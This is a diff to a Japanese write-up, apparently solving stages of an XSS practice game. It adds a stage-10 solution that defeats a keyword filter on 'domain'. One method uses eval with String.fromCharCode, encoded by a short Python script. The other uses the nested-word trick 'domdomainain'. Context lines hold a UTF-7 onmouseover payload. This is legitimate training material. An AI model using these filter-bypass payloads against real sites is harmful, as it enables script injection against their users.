@@ -16,13 +16,7 @@
     - [1 (normal)](#1-normal-1)
     - [2 (bypass \<input value="">)](#2-bypass-%5Cinput-value)
     - [3 (inject \<select>tag)](#3-inject-%5Cselecttag)
-    - [4 (bypas \<input type="hidden" value="">)](#4-bypas-%5Cinput-typehidden-value)
-    - [5 (bypass maxlength="15")](#5-bypass-maxlength15)
-    - [6 (fileter "<>")](#6-fileter-)
-    - [7 (inject \<input value= > with no quote)](#7-inject-%5Cinput-value--with-no-quote)
-    - [8 (href)](#8-href)
-    - [9 (UTF-7 XSS)](#9-utf-7-xss)
-    - [10](#10)
+    - [4](#4)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -272,9 +266,37 @@ Content-Type: text/html; charset=euc-jpffff+ACI- onmouseover=+ACI-alert(document
 
 <input type="text" name="p1" size="50" value="ffff+ACI- onmouseover=+ACI-alert(document.domain)">
 ```
-### 10
+### 10 (filter "domain")
 ![image](https://user-images.githubusercontent.com/56021519/103078634-a7e51d80-4615-11eb-8338-6714f148dacc.png)   
+さっきと同じ`"><script>alert(document.domain);</script>`を送信すると`domain`という文字がフィルタリングされている。   
+```txt
+No results for your Query. Try again: 
+<input type="text" name="p1" size="50" value="bbb">
+<script>alert(document.);</script>
+"> 
+```
+以下で文字列を生成して、`"><script>eval(`${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}`)</script>`で`eval("alert(document.domain)")`と同じことをすると成功！   
+```python
+S = """alert(document.domain)"""
 
+C = []
+for s in S:
+    C.append(ord(s))
+
+print("${" + "String.fromCharCode({})".format(",".join(list(map(str, C)))) + "}")
+# ${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}
+```
+そもそも`"><script>alert(document.domdomainain);</script>`でいけたは…   
+ちなみに、`” onmouseover=alert(document.domdomainain); x=”`でマウスをinpuの中にセットすれば行けるはずだけどなんかうまく行ってない…   
+![image](https://user-images.githubusercontent.com/56021519/103080190-abc66f00-4618-11eb-9472-12257140c6eb.png)   
+### 11 ページが動いてない…
+### 12 IE
+### 13 IE
+### 14 IE
+### 15 
+### 17 IE
+### 18 IE
+### 19
 
 
 
